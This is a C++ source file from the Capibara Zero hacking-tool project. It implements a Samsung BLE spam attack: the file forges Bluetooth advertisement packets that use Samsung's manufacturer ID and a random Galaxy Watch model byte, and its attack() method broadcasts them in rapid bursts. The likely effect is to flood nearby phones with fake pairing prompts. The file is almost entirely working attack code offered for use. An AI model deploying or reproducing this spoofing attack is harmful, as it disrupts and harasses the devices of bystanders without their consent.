/*
 * This file is part of the Capibara zero project(https://capibarazero.github.io/).
 * Copyright (c) 2023 Andrea Canale.
 * Copyright (c) 2023 Spooks4576
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, version 3.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "samsung_ble_spam.hpp"

SamsungBleSpam::SamsungBleSpam()
{
  pServer = NimBLEDevice::createServer();

  pAdvertising = pServer->getAdvertising();
}

SamsungBleSpam::~SamsungBleSpam()
{
  pServer->stopAdvertising();
}

NimBLEAdvertisementData SamsungBleSpam::getOAdvertisementData()
{
    NimBLEAdvertisementData randomAdvertisementData = NimBLEAdvertisementData();
    uint8_t packet[15];
    uint8_t i = 0;

    uint8_t model = watch_models[rand() % 25].value;

    packet[i++] = 15; // Size
    packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
    packet[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
    packet[i++] = 0x00; // ...
    packet[i++] = 0x01;
    packet[i++] = 0x00;
    packet[i++] = 0x02;
    packet[i++] = 0x00;
    packet[i++] = 0x01;
    packet[i++] = 0x01;
    packet[i++] = 0xFF;
    packet[i++] = 0x00;
    packet[i++] = 0x00;
    packet[i++] = 0x43;
    packet[i++] = (model >> 0x00) & 0xFF; // Watch Model / Color (?)

  randomAdvertisementData.addData(std::string((char *)packet, 15));
  return randomAdvertisementData;
}

void SamsungBleSpam::attack()
{
  delay(40);
  NimBLEAdvertisementData advertisementData = getOAdvertisementData();
  pAdvertising->setAdvertisementData(advertisementData);
  pAdvertising->start();
  delay(20);
  pAdvertising->stop();
}
